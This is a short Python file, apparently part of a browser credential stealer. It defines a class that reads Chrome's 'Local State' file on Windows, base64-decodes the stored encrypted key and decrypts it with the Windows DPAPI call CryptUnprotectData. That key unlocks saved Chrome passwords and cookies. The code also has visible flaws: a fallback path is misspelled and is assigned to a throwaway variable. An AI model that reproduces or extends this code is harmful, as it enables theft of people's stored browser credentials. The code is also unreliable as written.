# -*- coding: utf-8 -*-
# Author: Abdulrahman Mohammed (De3vil)
# Don't touch my code, it's art 
#+==============================
from os import path , environ  
from base64 import b64decode
from win32crypt import CryptUnprotectData
from json import loads

class Encryption_key:
    def __init__(self):
        self.key = ""
        self.local_state_path = path.join(environ
            [
            "USERPROFILE"
            ],
            "AppData", "Local",
            "Google", "Chrome",
            "User Data", "Local State"
            )
        if path.exists(self.local_state_path):
            self.local_state_path = self.local_state_path
        else :
            local_state_path = path.join
            (
                "C:",
                "\Chrone",
                "User Data",
                "Local State"
            )
    def get_encryption_key(self):    
        with open(self.local_state_path, "r", encoding="utf-8") as file:
            local_state = file.read()
            local_state = loads(local_state)    
        self.key = b64decode(local_state["os_crypt"]["encrypted_key"])
        self.key = self.key[5:]
        return CryptUnprotectData(self.key, None, None, None, 0)[1]
